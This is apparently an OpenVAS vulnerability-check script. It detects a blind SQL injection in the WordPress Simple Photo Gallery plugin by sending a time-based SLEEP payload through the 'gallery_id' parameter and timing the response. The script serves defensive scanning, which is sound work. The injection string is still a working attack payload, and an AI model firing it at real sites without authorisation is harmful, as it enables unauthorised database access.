###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_simple_photo_gall_blind_sql_inj_vuln.nasl 49449 2015-05-28 16:22:43Z may$
#
# Wordpess Simple Photo Gallery Blind SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805193");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-05-28 16:25:29 +0530 (Thu, 28 May 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Wordpess Simple Photo Gallery Blind SQL Injection Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Wordpress
  Simple Photo Gallery and is prone to blind sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to improper sanitization of
  user supplied input passed via 'gallery_id' parameter to the
  '/wppg_photogallery/wppg_photo_details' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"WordPress Simple Photo Gallery version
  1.7.8, prior versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 1.8.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37113");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/simple-photo-gallery/changelog");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

wait_extra_sec = 5;
hostName = get_host_name();

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Plugin installation Url
url = dir + "/index.php/wppg_photogallery/wppg_photo_details/";

sndReq = http_get(item:url, port:http_port);
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
useragent = http_get_user_agent();

if(rcvRes =~ "^HTTP/1\.[01] 301")
{
  url1 = egrep( pattern:"Location:.*://.*/index.php/wppg_photogallery/wppg_photo_details/", string:rcvRes);
  hostname = split(url1, sep:"/", keep:FALSE);
  if(!hostname[2]){
    exit(0);
  }
  hostName = hostname[2];

  sndReq = 'GET ' + url + ' HTTP/1.1\r\n' +
           'User-Agent: ' + useragent + '\r\n' +
           'Host: ' + hostName + '\r\n' +
           'Connection: Keep-Alive\r\n' + '\r\n';

  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
}

if(rcvRes =~ "^HTTP/1\.[01] 200" && "wp-content/plugins/simple-photo-gallery" >< rcvRes)
{
  ## Added Multiple times, to make sure its working properly
  sleep = make_list(3, 5);

  ## Use sleep time to check we are able to execute command
  foreach sec (sleep)
  {
    url = dir + "/index.php/wppg_photogallery/wppg_photo_details/?"
              + "gallery_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(" + sec + ")))QBzh)";

    sndReq = 'GET ' + url + ' HTTP/1.1\r\n' +
             'User-Agent: ' + useragent + '\r\n' +
             'Host: ' + hostName + '\r\n' +
             'Connection: Keep-Alive\r\n' + '\r\n';

    start = unixtime();
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
    stop = unixtime();

    time_taken = stop - start;

    if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
  }
  security_message(http_port);
  exit(0);
}
